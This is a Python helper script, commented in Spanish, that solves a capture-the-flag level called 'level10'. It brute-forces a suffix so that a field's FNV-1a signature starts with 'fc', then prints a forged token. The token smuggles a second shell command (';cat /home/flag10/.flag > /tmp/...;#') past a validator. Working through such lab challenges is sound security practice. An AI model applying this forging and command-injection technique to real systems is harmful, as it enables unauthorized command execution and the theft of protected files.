#!/usr/bin/env python3

# find_injection_token.py
#
# Recurso auxiliar para level10: busca por fuerza bruta un sufijo tal que
# la firma FNV-1a del campo resultante empiece por "fc". Ese prefijo hace
# que validate.js derive la clave del handler "logger" (ver level10.md,
# seccion 4), lo que permite inyectar el comando que copia la flag.
#
# El campo probado tiene la forma "x<sufijo>;cat /home/flag10/.flag >
# /tmp/level10_flag.txt;#": el ";" cierra el comando esperado por el
# handler y abre uno propio, y el "#" comenta el resto de la linea.

import string

TARGET_PREFIX = "fc"
SUFFIX_CHARACTERS = string.ascii_lowercase + string.digits


def fnv1a(value):
    # Hash FNV-1a de 32 bits, igual al _hash() usado por validate.js para
    # calcular la firma del token.
    result = 0x811C9DC5
    for character in value:
        result = ((result ^ ord(character)) * 0x01000193) & 0xFFFFFFFF
    return result


# Prueba sufijos de longitud creciente (1, 2, 3...) y, para cada longitud,
# recorre todas las combinaciones posibles de SUFFIX_CHARACTERS,
# convirtiendo "number" a base len(SUFFIX_CHARACTERS) para generarlas.
for length in range(1, 8):
    for number in range(len(SUFFIX_CHARACTERS) ** length):
        suffix = ""
        current = number
        for _ in range(length):
            current, index = divmod(current, len(SUFFIX_CHARACTERS))
            suffix += SUFFIX_CHARACTERS[index]
        # Campo final: "x" + sufijo + ";cat .../.flag > .../level10_flag.txt;#"
        field = suffix.join(("x", ";cat /home/flag10/.flag > /tmp/level10_flag.txt;#"))
        signature = f"{fnv1a(field):08x}"
        if signature.startswith(TARGET_PREFIX):
            # Firma encontrada: imprime el token completo v1:<campo>:<firma>
            # y termina, tal como se usa luego en enzo-injection.wat.
            print(f"v1:{field}:{signature}")
            raise SystemExit
